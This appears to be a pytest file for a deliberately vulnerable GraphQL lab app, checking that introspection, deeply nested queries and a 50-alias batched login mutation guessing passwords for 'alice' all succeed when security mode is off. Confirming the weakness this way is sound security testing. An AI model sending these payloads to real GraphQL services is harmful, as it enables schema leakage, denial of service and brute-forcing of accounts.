"""
GraphQL API — Vulnerability Confirmation Tests
Prove that all three attacks SUCCEED on the VULNERABLE server (SECURE_MODE=false).
"""
import json
import pytest


GQL = "/graphql"

INTROSPECTION_QUERY = '{ __schema { types { name } } }'

DEEP_QUERY = """
{
  user(id: 1) {
    username
    posts {
      title
      author {
        username
        posts {
          title
          author {
            username
            posts { title author { username } }
          }
        }
      }
    }
  }
}
"""

def batched_login(n=50):
    aliases = "\n  ".join(
        f'a{i}: login(username: "alice", password: "wrongpass{i}") {{ token message }}'
        for i in range(1, n + 1)
    )
    return f"mutation {{ {aliases} }}"


class TestIntrospectionVulnerable:
    def test_schema_is_returned(self, vuln_gql):
        r = vuln_gql.post(GQL, json={"query": INTROSPECTION_QUERY},
                          content_type="application/json")
        assert r.status_code == 200
        data = r.get_json()
        assert "errors" not in data or data.get("data") is not None
        types = data.get("data", {}).get("__schema", {}).get("types", [])
        assert len(types) > 0, "Vulnerable server must return schema types"

    def test_user_type_fields_are_leaked(self, vuln_gql):
        query = '{ __type(name: "UserType") { fields { name } } }'
        r = vuln_gql.post(GQL, json={"query": query}, content_type="application/json")
        assert r.status_code == 200
        data = r.get_json()
        fields = data.get("data", {}).get("__type", {})
        assert fields is not None


class TestDepthDoSVulnerable:
    def test_deep_query_is_accepted(self, vuln_gql):
        """8-level nested query must be accepted on vulnerable server."""
        r = vuln_gql.post(GQL, json={"query": DEEP_QUERY},
                          content_type="application/json")
        assert r.status_code == 200, (
            f"Vulnerable server must accept deep query, got {r.status_code}"
        )

    def test_response_has_nested_data(self, vuln_gql):
        r = vuln_gql.post(GQL, json={"query": DEEP_QUERY},
                          content_type="application/json")
        data = r.get_json()
        # Should have data without a depth-limit error
        gql_errors = data.get("errors", [])
        depth_errors = [e for e in gql_errors if "depth" in e.get("message", "").lower()]
        assert len(depth_errors) == 0, "Vulnerable server must not block on depth"


class TestAliasBatchingVulnerable:
    def test_batched_mutation_is_accepted(self, vuln_gql):
        """50-alias batched mutation must be accepted on vulnerable server."""
        r = vuln_gql.post(GQL, json={"query": batched_login(50)},
                          content_type="application/json")
        assert r.status_code == 200, (
            f"Vulnerable server must accept batched mutations, got {r.status_code}"
        )

    def test_all_aliases_are_processed(self, vuln_gql):
        r = vuln_gql.post(GQL, json={"query": batched_login(10)},
                          content_type="application/json")
        data = r.get_json()
        results = data.get("data", {})
        assert len(results) == 10, (
            f"All 10 aliased mutations must be processed, got {len(results)}"
        )
